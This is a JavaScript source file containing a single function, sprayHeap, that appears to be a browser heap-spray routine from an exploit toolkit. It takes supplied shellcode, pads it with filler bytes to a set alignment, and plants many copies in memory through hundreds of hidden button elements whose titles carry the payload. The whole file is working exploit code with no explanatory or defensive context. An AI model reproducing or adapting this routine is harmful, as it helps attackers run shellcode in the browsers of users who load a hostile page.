var sym_div_container;
function sprayHeap( oArg ) {
  var shellcode     = oArg.shellcode;
  var offset        = oArg.offset;
  var heapBlockSize = oArg.heapBlockSize;
  var maxAllocs     = oArg.maxAllocs;
  var objId         = oArg.objId;

  if (shellcode     == undefined)  { throw "Missing argument: shellcode"; }
  if (offset        == undefined)  { offset        = 0x00; }
  if (heapBlockSize == undefined)  { heapBlockSize = 0x80000; }
  if (maxAllocs     == undefined)  { maxAllocs     = 0x350; }

  if (offset > 0x800) { throw "Bad alignment"; }

  sym_div_container = document.getElementById(objId);

  if (sym_div_container == null) {
    sym_div_container = document.createElement("div");
  }

  sym_div_container.style.cssText = "display:none";
  var data;
  junk = unescape("%u2020%u2020");
  while (junk.length < offset+0x1000) junk += junk;

  data = junk.substring(0,offset) + shellcode;
  data += junk.substring(0,0x800-offset-shellcode.length);

  while (data.length < heapBlockSize) data += data;

  for (var i = 0; i < maxAllocs; i++)
  {
    var obj = document.createElement("button");
    obj.title = data.substring(0, (heapBlockSize-2)/2);
    sym_div_container.appendChild(obj);
  }
}